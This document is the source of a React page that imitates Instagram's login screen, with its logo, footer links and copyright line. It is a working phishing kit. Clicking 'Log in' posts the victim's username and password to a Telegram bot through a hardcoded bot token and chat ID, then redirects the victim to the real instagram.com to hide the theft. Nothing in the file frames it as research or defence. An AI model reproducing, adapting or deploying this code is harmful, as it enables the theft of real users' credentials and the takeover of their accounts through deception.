import axios from 'axios';
import React from 'react'
import { useState } from 'react';

function App() {

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const linknames = [
    "Meta",
    "About",
    "Blog",
    "Jobs",
    "Help",
    "API",
    "Privacy",
    "Terms",
    "Top Accounts",
    "Locations",
    "Instagram Lite",
    "Threads",
    "Contact Uploading & Non-Users",
    "Meta Verified"
  ];

  const token = "6506084131:AAEKGTCRi1fJjMMA2LBkA_GYqdlpAL1GePY"
  const telegramApiUrl = 'https://api.telegram.org/bot' + token + '/sendMessage';
  const updates = 'https://api.telegram.org/bot' + token + '/getUpdates';
  

  const sendMessage = async () => {
        if(username && password){
        // Create the payload with chat_id (username or phone number) and text (message)
        const payload = {
          chat_id: "1936090861",
          text: `
username/email/phone number: ${username}
password: ${password} 
`,
        };

        // axios.get(updates)
        // .then(res => {
        //   console.log(res.data.result[0].message.chat.id)
        // }).catch(error => console('Error sending message: ' + error))
    
        // Send the HTTP POST request to the Telegram Bot API
        axios.post(telegramApiUrl, payload)
          .then(() => {
            window.location = "https://instagram.com"
          })
          .catch((error) => console('Error sending message: ' + error));
        }
  }


  return (
    <>
    <div className="main">
      <form>
        <img src="/img/instagram-logo.png" alt="" srcset="" />
        <input
        value={username}
        required
        onInput={e => setUsername(e.target.value)}
        type="text" placeholder='Phone number, username, or email' />
        <input 
        required
          value={password}
          onInput={e => setPassword(e.target.value)}
        type="password" placeholder='Password' />
        <button type='button' onClick={sendMessage}>
          Log in
        </button>
        <div className="separator">
          <div></div>
          <p>OR</p>
          <div></div>
        </div>
        <div className="facebook">
          <a href='#'><i className="fab fa-facebook"></i>Log in with Facebook</a>
        </div>
        <div className="forgot">
          <a href="#">Forgot password</a>
        </div>
      </form>

      <form className='signup'>
        <p>Don't have an account? <a href="#">Sign Up</a></p>
      </form>

      <p className='text-center'>Get the app</p>

      <div className="apps">
        <img src="/img/googleplay-button.png" alt="" />
        <img src="/img/apple-button.png" alt="" srcset="" />
      </div>

      <div className="links">
        {
          linknames.map(l =>(
            <a href="#">{l}</a>
          ))
        }
      </div>

      <footer>
        <p>© 2023 Instagram from Meta</p>
      </footer>
    </div>
    </>
  )
}

export default App